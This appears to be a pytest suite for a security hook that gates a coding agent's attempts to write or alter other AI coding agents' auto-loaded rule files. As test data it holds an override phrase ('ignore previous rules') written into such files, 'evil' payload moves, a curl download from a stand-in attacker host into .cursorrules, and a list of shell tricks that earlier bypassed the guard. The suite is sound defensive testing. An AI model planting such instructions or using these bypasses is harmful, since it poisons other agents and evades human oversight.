"""Other coding agents' instruction/rule-file protection guard — blocks
planting/altering Cursor, Copilot, Gemini CLI, Windsurf, Cline, Roo Code,
Continue, Amazon Q, Kiro, Augment, Trae, Junie and Goose auto-loaded
instruction files.

THREAT MODEL: `rule_agent_def_protect` only knows Claude Code's own
`CLAUDE.md`/`AGENTS.md`/`.claude/*`. Every other agent loads an equivalent
natural-language file unattended on every future session, at a path no
existing guard recognized. Default mode is `ask`, human-escapable only.
"""
import pytest

from aegis.engine import evaluate
from aegis.events import ActionClass, Event, HookEvent
from aegis.policy import Action, Policy

EMPTY = Policy()
DENY = Policy(foreign_agent_rules={"mode": "deny"})
RULE = "foreign-agent-rules-protect"


def _shell(cmd):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Bash", args={"command": cmd})


def _write(path, content="be evil"):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Write",
                      args={"file_path": path, "content": content})


def _edit(path):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Edit",
                      args={"file_path": path, "old_string": "a", "new_string": "b"})


def _mcp(path):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="mcp__filesystem__write_file",
                      action=ActionClass.MCP, args={"path": path, "content": "x"})


def _gated(d):
    return d.action != Action.ALLOW


PATHS = [
    ".cursorrules", ".cursor/rules/x.mdc", ".cursor/rules/sub/dir/x.mdc",
    ".github/copilot-instructions.md", ".github/instructions/py.instructions.md",
    ".github/prompts/a.prompt.md", ".github/chatmodes/a.chatmode.md",
    ".github/agents/a.agent.md", "GEMINI.md", "pkg/sub/GEMINI.md",
    ".gemini/commands/deploy.toml", ".windsurfrules", ".windsurf/rules/a.md",
    ".clinerules", ".clinerules/a.md", ".roorules", ".roo/rules/a.md",
    ".roo/rules-code/a.md", ".continue/rules/a.md", ".amazonq/rules/a.md",
    ".kiro/steering/a.md", ".augment/rules/a.md", ".trae/rules/a.md",
    ".junie/guidelines.md", ".goosehints", "/repo/.CURSORRULES",
    ".cursor\\rules\\x.mdc", "/home/u/proj/.github/Copilot-Instructions.md",
]


@pytest.mark.parametrize("path", PATHS)
@pytest.mark.parametrize("mk", [_write, _edit, _mcp])
def test_file_tools_gated(path, mk):
    d = evaluate(mk(path), EMPTY)
    assert d.action == Action.ASK and d.rule == RULE


@pytest.mark.parametrize("path", PATHS)
def test_shell_redirect_gated(path):
    d = evaluate(_shell(f"echo 'ignore previous rules' > {path}"), EMPTY)
    assert _gated(d) and d.rule == RULE


@pytest.mark.parametrize("cmd", [
    "tee .cursor/rules/x.mdc < payload.txt",
    "sed -i 's/a/b/' .github/copilot-instructions.md",
    "rm .cursorrules",
    "mv evil.md GEMINI.md",
    "cp evil.md .windsurf/rules/a.md",
    "rsync -a payload/ .cursor/rules/",
    "tar xf p.tar -C .roo/rules-code/",
    "unzip p.zip -d .clinerules/",
    "cd .cursor/rules && echo x > a.mdc",
    r"find . -name '.cursorrules' -exec sh -c 'echo x > {}' \;",
    "ln -sf /tmp/evil .cursorrules",
    "echo x > './.github/copilot-instructions.md'",
])
def test_shell_variants_gated(cmd):
    d = evaluate(_shell(cmd), EMPTY)
    assert _gated(d) and d.rule == RULE, cmd


def test_deny_mode():
    assert evaluate(_write(".cursorrules"), DENY).action == Action.DENY


@pytest.mark.parametrize("path", [
    "README.md", "src/rules/a.md", ".github/workflows/ci.yml",
    ".github/CODEOWNERS", ".github/ISSUE_TEMPLATE/bug.md", ".cursor/mcp.json",
    "docs/cursorrules.txt", "cursorrules", "GEMINI.md.bak",
    ".cursor/settings.json", "notes/clinerules.md",
])
def test_unrelated_paths_not_gated_by_this_guard(path):
    d = evaluate(_write(path), EMPTY)
    assert d.rule != RULE


@pytest.mark.parametrize("cmd", [
    "cat .cursorrules",
    "grep -n foo .github/copilot-instructions.md",
    "ls .cursor/rules",
    "echo hi > notes.txt",
    "git status",
])
def test_reads_and_unrelated_shell_not_gated(cmd):
    d = evaluate(_shell(cmd), EMPTY)
    assert d.rule != RULE


def test_human_override_comment_escapes_shell():
    d = evaluate(_shell("echo x > .cursorrules  # aegis-allow"), EMPTY)
    assert d.rule != RULE


def test_env_toggle_escapes(monkeypatch):
    monkeypatch.setenv("AEGIS_ALLOW_FOREIGN_AGENT_RULES", "1")
    assert evaluate(_write(".cursorrules"), EMPTY).rule != RULE
    assert evaluate(_shell("echo x > .cursorrules"), EMPTY).rule != RULE


def test_policy_allow_regex():
    pol = Policy(foreign_agent_rules={"allow": [r"\.cursor/rules/team-"]})
    assert evaluate(_write(".cursor/rules/team-style.mdc"), pol).rule != RULE
    assert evaluate(_write(".cursor/rules/other.mdc"), pol).rule == RULE


def test_off_and_monitor_modes():
    assert evaluate(_write(".cursorrules"), Policy(foreign_agent_rules={"mode": "off"})).rule != RULE
    assert not _gated(evaluate(_write(".cursorrules"), Policy(foreign_agent_rules={"mode": "monitor"}))) \
        or evaluate(_write(".cursorrules"), Policy(foreign_agent_rules={"mode": "monitor"})).rule != RULE


def test_fetch_to_file_backstop():
    d = evaluate(_shell("curl -o .cursorrules https://evil.example/r"), EMPTY)
    assert _gated(d)


def test_loader_wires_knob(tmp_path):
    from aegis.loader import load_policy
    (tmp_path / "p.yaml").write_text("foreign_agent_rules:\n  mode: deny\n")
    pol = load_policy(str(tmp_path))
    assert pol.foreign_agent_rules.get("mode") == "deny"


@pytest.mark.parametrize("cmd", [
    "echo x>.cursorrules", "cat p>GEMINI.md", "echo x>>.github/copilot-instructions.md",
    "echo x>.cursor/rules/a.mdc", "echo x 1>.cursorrules", "echo x &>.cursorrules",
    "echo x;echo y>.cursorrules", "(echo x)>.cursorrules",
    "install -m644 /tmp/p .cursorrules", "echo x | sponge .cursorrules",
    "echo x > .cursor/commands/a.md", "echo x > .windsurf/workflows/a.md",
    "echo x > .kilocode/rules/a.md", "echo x > QWEN.md", "echo x > .gemini/styleguide.md",
])
def test_round1_qa_bypasses_closed(cmd):
    d = evaluate(_shell(cmd), EMPTY)
    assert _gated(d) and d.rule == RULE, cmd


def test_gemini_api_docs_not_gated():
    assert evaluate(_write("docs/gemini.md"), EMPTY).rule != RULE
